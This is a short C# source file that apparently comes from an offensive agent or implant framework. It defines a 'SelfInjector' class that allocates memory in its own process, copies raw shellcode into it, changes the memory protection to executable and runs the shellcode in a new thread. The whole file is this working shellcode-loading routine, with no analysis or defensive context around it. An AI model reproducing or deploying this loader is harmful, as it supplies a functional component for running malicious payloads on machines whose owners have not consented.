using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Agent.Internal;
using Agent.Native;

namespace Agent.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var baseAddr = Native.Kernel32.VirtualAlloc(IntPtr.Zero, shellcode.Length,
                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                Kernel32.MemoryProtection.ReadWrite);
            //Native.Kernel32.WriteProcessMemory(, baseAddr, shellcode, shellcode.Length, )
            Marshal.Copy(shellcode , 0, baseAddr, shellcode.Length);
            Native.Kernel32.VirtualProtect(baseAddr, shellcode.Length, Kernel32.MemoryProtection.ExecuteRead, out var old);
            Native.Kernel32.CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out var tid);

            if (tid != IntPtr.Zero)
                return true;
            return false;

        } 
    }
}
